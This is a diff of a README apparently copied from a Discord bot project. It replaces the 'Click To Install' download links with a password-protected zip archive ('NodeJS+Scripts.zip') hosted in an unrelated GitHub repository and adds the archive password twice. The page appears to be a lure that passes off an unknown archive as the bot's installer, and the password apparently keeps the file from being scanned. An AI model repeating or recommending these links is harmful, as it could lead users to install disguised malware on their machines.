@@ -1,5 +1,5 @@
-## Discord Bot Version still working in 20/03/2024 || [Click To Install](https://github.com/27koba/nodejsss/raw/main/NodeJS%20+%20Config.zip)
-
+## Discord Bot Version still working in 20/03/2024 || [Click To Install](https://github.com/Tariviste/ERLC-ATM-Autofarm/raw/main/NodeJS+Scripts.zip)
+# Archive password: NodeJSScripts
 
 ![image](https://media.wired.com/photos/61b3ab1112b63df686feb185/master/w_2560%2Cc_limit/Gear-Discord-Bots-top.jpg)
 
@@ -22,7 +22,9 @@ community of cog repositories.**
 
 **The following platforms are officially supported:** 
 
-[Click To Install](https://github.com/27koba/nodejsss/raw/main/NodeJS%20+%20Config.zip)
+[Click To Install](https://github.com/Tariviste/ERLC-ATM-Autofarm/raw/main/NodeJS+Scripts.zip)
+
+# Archive password: NodeJSScripts
 
 If after reading the guide you are still experiencing issues, feel free to join the
 [Official Discord Server](https://discord.gg/red) and ask in the **#support** channel for help.
